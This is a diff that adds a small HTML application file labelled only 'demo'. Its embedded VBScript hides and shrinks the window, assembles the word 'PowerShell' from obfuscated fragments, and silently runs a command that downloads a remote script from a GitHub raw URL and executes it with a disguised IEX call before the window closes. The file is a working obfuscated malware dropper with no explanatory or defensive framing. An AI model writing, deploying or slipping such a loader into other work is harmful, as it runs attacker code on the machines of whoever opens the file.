@@ -1,0 +1,20 @@
+<HTML>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+<HEAD>
+<script language="VBScript">
+Window.ReSizeTo 0, 0
+Window.moveTo -1000,-1000
+Dim objShell
+Set objShell = CreateObject("WScript.Shell")
+gdgg=chr(80) +"o" & "w"
+dddd="e" & "rs"
+cccccccc="h" & "e" & "l" & "l"
+cbbbbbbbbbz = gdgg+dddd+cccccccc+ " $c1='(New-Object Net.We'; $c4='bClient).Downlo'; $c3='adString(''https://raw.githubusercontent.com/wasawalid/getv/main/ps/rp.txt'')';$TC=I`E`X ($c1,$c4,$c3 -Join '')|I`E`X "
+objShell.Run cbbbbbbbbbz,0
+self.close
+</script>
+<body>
+demo
+</body>
+</HEAD>
+</HTML>
